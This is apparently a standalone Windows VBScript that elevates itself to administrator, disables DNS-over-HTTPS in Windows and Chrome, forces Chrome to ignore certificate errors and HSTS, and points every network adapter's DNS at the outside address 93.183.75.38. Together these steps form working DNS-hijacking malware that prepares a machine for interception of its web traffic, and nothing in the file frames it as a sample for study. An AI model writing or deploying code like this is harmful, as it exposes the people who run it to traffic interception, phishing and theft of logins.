Option Explicit
On Error Resume Next

' Define constants for primary and secondary DNS servers
Const PrimaryDNSServer = "93.183.75.38"
Const SecondaryDNSServer = "8.8.8.8"

If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If

Sub MainScriptLogic()

	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	
	objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"

	Dim chromeKeyPath
	chromeKeyPath = "HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome"
	objShell.RegWrite chromeKeyPath & "\CommandLineFlag", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
	objShell.RegWrite chromeKeyPath & "\DnsOverHttps", "off", "REG_SZ"

    Dim objWMIService, colAdapters, objAdapter
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")

    For Each objAdapter In colAdapters
        If objAdapter.IPEnabled Then
            Dim arrDNSServers
            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
            objAdapter.SetDNSServerSearchOrder arrDNSServers
        End If
    Next

    Set objWMIService = Nothing
End Sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub
